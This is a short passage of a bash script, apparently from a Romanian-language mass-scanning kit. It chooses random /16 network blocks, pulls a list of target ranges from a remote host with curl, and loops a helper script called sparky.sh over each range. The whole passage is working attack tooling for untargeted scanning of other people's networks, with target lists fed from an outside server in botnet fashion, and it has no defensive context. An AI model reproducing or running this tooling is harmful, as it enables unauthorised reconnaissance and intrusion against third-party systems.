classb="`seq 0 255`"
classb2=($classb)
num_classb=${#classb2[*]}
b=${classb2[$((RANDOM%num_classb))]}

classes=($class)
num_class=${#classes[*]}
a=${classes[$((RANDOM%num_class))]}
touch class
curl -s http://www.karaibe.us/.foo/feed/class.php --connect-timeout 10 > class
sleep 1
actualsize=$(wc -c < class)
minimumsize=4
if [ ! $actualsize -ge $minimumsize ]; then
	echo "scanez clasa ${a}.${b}"
	./sparky.sh ${a}.${b}
else
	for clasa in `cat class`
	do
		echo "scanez clasa $clasa"
		./sparky.sh $clasa
	done
fi
done
